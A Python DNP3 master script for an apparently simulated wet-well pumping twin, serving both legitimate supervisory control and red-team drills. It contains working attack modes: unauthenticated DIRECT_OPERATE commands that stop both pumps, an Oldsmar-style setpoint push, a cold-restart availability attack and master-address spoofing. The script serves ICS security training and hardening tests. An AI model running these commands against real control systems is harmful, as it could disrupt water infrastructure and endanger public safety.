#!/usr/bin/env python3
"""
master.py -- DNP3 master / front-end processor (scada-master), TWIN edition.

Extends the base lab master with the supervisory behaviour the wet-well twin
needs, while keeping the original attacker primitives so the same script drives
both the legit control-center and the red-team drills.

Legit control center:
  python master.py --host dnp3-gw --poll-loop 5           # continuous integrity poll
  python master.py --host dnp3-gw --stop-pump 0           # supervised SELECT+OPERATE stop P-1
  python master.py --host dnp3-gw --start-pump 1          # supervised start P-2
  python master.py --host dnp3-gw --setpoint-lead 60      # g41 WRITE LEAD_START=60%
  add --sav5 to attach the SAv5 aggressive-mode HMAC (needed against a HARDEN+SAV5 gw)

Red team (unchanged intent, remapped to pumps):
  python master.py --host dnp3-gw --attack                # unauth DIRECT_OPERATE: STOP both pumps
  python master.py --host dnp3-gw --setpoint-lead 150     # Oldsmar: push LEAD_START out of reach
  python master.py --host dnp3-gw --restart               # cold restart (availability)
  --src-addr 100 spoofs the master's DNP3 link address.
"""
import argparse
import socket
import struct
import time

import dnp3lib as d

MASTER_ADDR = 100
OUTSTN_ADDR = 10
USE_SAV5 = False


def decode_response(user):
    p = d.parse_app(user)
    if not p:
        return
    ac, func, name, objs = p
    print(f"  <- {name} (fc=0x{func:02x})")
    if func in (0x81, 0x82):     # responses carry a 2-byte IIN before objects
        objs = objs[2:]
    i = 0
    while i + 3 <= len(objs):
        g, v, q = objs[i], objs[i + 1], objs[i + 2]
        i += 3
        if g == 1 and v == 2:                    # binary inputs
            start, stop = objs[i], objs[i + 1]; i += 2
            pts = [objs[i + k] for k in range(stop - start + 1)]; i += len(pts)
            states = [(b >> 7) & 1 for b in pts]
            print(f"     binary inputs {start}-{stop}: {states}  (P1,P2,HLA,fault)")
        elif g == 30 and v == 1:                 # 32-bit analog inputs
            start, stop = objs[i], objs[i + 1]; i += 2
            vals = []
            for _ in range(stop - start + 1):
                val = struct.unpack('<i', objs[i + 1:i + 5])[0]; i += 5
                vals.append(val)
            lvl = vals[0] / 100.0 if vals else 0
            print(f"     analog inputs {start}-{stop}: {vals}  (level={lvl:.1f}% flow psi)")
        elif g == 40 and v == 1:                 # analog output status (setpoints)
            start, stop = objs[i], objs[i + 1]; i += 2
            vals = []
            for _ in range(stop - start + 1):
                val = struct.unpack('<i', objs[i + 1:i + 5])[0]; i += 5
                vals.append(val)
            print(f"     setpoints {start}-{stop}: {[x/100.0 for x in vals]} %")
        else:
            break


_SAV5_CSQ = 0  # monotonic challenge sequence number (anti-replay freshness)


def _ctrl_objects(ac, func, objects):
    """Attach the SAv5 aggressive-mode HMAC tag over (ac,func,objects) if enabled.

    Matches the gateway's sav5_seal layout: core || CSQ(4, big-endian) || tag,
    where the tag authenticates (ac||func||core||CSQ). The CSQ increases with
    every control so the HARDEN+SAV5 gateway accepts it as fresh; a replay of an
    identical frame carries a stale CSQ and is rejected (see dnp3/gateway.py
    sav5_verify + lab/twin/test_sav5.py)."""
    if USE_SAV5:
        global _SAV5_CSQ
        _SAV5_CSQ += 1
        csq_bytes = struct.pack(">I", _SAV5_CSQ & 0xFFFFFFFF)
        tag = d.sav5_tag(bytes([ac, func]) + bytes(objects) + csq_bytes)
        return bytes(objects) + csq_bytes + tag
    return objects


def send(sock, frame, label, wait=True):
    sock.sendall(frame)
    print(f"  -> {label}")
    if not wait:
        return
    time.sleep(0.2)
    sock.settimeout(2.0)
    try:
        fr = d.read_frame(sock)
        if fr:
            decode_response(fr[3])
    except socket.timeout:
        print("     (no response)")


def integrity_poll(s, seq):
    send(s, d.msg(d.CTRL_MASTER, OUTSTN_ADDR, MASTER_ADDR, seq, d.appctl(seq), 0x01, d.obj_class_poll()),
         "READ integrity poll (Class 1/2/3/0)")


def crob_select_operate(s, seq, index, start):
    cc = d.CROB_CLOSE_PULSE if start else d.CROB_TRIP_PULSE
    verb = "START" if start else "STOP"
    ac = d.appctl(seq)
    cr = d.crob(index, cc)
    send(s, d.msg(d.CTRL_MASTER, OUTSTN_ADDR, MASTER_ADDR, seq, ac, 0x03, _ctrl_objects(ac, 0x03, cr)),
         f"SELECT pump{index+1} {verb}")
    seq = (seq + 1) & 0x0F
    ac = d.appctl(seq)
    send(s, d.msg(d.CTRL_MASTER, OUTSTN_ADDR, MASTER_ADDR, seq, ac, 0x04, _ctrl_objects(ac, 0x04, cr)),
         f"OPERATE pump{index+1} {verb}")
    return (seq + 1) & 0x0F


def g41_setpoint(s, seq, index, pct):
    ac = d.appctl(seq)
    obj = d.obj_analog_output(index, int(round(pct * 100)))
    send(s, d.msg(d.CTRL_MASTER, OUTSTN_ADDR, MASTER_ADDR, seq, ac, 0x02, _ctrl_objects(ac, 0x02, obj)),
         f"WRITE g41 setpoint idx {index} = {pct}%")
    return (seq + 1) & 0x0F


def main():
    global MASTER_ADDR, USE_SAV5
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=20000)
    ap.add_argument("--poll-loop", type=int, default=0, help="continuous integrity poll every N seconds")
    ap.add_argument("--start-pump", type=int, help="supervised SELECT+OPERATE start pump IDX (0/1)")
    ap.add_argument("--stop-pump", type=int, help="supervised SELECT+OPERATE stop pump IDX (0/1)")
    ap.add_argument("--setpoint-lead", type=float, help="WRITE g41 LEAD_START to this percent")
    ap.add_argument("--attack", action="store_true", help="unauth DIRECT_OPERATE: STOP both pumps")
    ap.add_argument("--restart", action="store_true", help="cold restart (availability attack)")
    ap.add_argument("--sav5", action="store_true", help="attach SAv5 aggressive-mode HMAC to controls")
    ap.add_argument("--src-addr", type=int, default=MASTER_ADDR,
                    help="DNP3 link source address (100=master; change to trip a link allow-list, "
                         "or keep 100 to spoof the master's identity)")
    args = ap.parse_args()
    MASTER_ADDR = args.src_addr
    USE_SAV5 = args.sav5

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3.0)
    try:
        s.connect((args.host, args.port))
    except OSError as e:
        print(f"[master] connect to {args.host}:{args.port} failed: {e}")
        return
    print(f"[master] connected to {args.host}:{args.port} (src addr {MASTER_ADDR}, sav5={USE_SAV5})")
    seq = 0

    if args.poll_loop > 0:
        print(f"[master] integrity poll loop every {args.poll_loop}s (Ctrl-C to stop)")
        try:
            while True:
                integrity_poll(s, seq); seq = (seq + 1) & 0x0F
                # opportunistically drain an UNSOLICITED 0x82 if one arrives
                s.settimeout(0.5)
                try:
                    fr = d.read_frame(s)
                    if fr:
                        print("[master] unsolicited/async frame:")
                        decode_response(fr[3])
                except socket.timeout:
                    pass
                time.sleep(args.poll_loop)
        except KeyboardInterrupt:
            print("\n[master] poll loop stopped")
            s.close(); return

    # one-shot: always start with an integrity poll for context
    integrity_poll(s, seq); seq = (seq + 1) & 0x0F

    if args.start_pump is not None:
        seq = crob_select_operate(s, seq, args.start_pump, start=True)
    if args.stop_pump is not None:
        seq = crob_select_operate(s, seq, args.stop_pump, start=False)
    if args.setpoint_lead is not None:
        seq = g41_setpoint(s, seq, d.AO_LEAD_START, args.setpoint_lead)

    if args.attack:
        print("[master] *** UNAUTHENTICATED DIRECT_OPERATE: STOP both pumps (no SELECT) ***")
        for idx in (d.CROB_P1, d.CROB_P2):
            ac = d.appctl(seq)
            cr = d.crob(idx, d.CROB_TRIP_PULSE)
            send(s, d.msg(d.CTRL_MASTER, OUTSTN_ADDR, MASTER_ADDR, seq, ac, 0x05, cr),
                 f"DIRECT_OPERATE STOP pump{idx+1}")
            seq = (seq + 1) & 0x0F

    if args.restart:
        print("[master] *** sending COLD RESTART ***")
        send(s, d.msg(d.CTRL_MASTER, OUTSTN_ADDR, MASTER_ADDR, seq, d.appctl(seq), 0x0D, b""), "COLD_RESTART")
        seq = (seq + 1) & 0x0F

    s.close()
    print("[master] done")


if __name__ == "__main__":
    main()
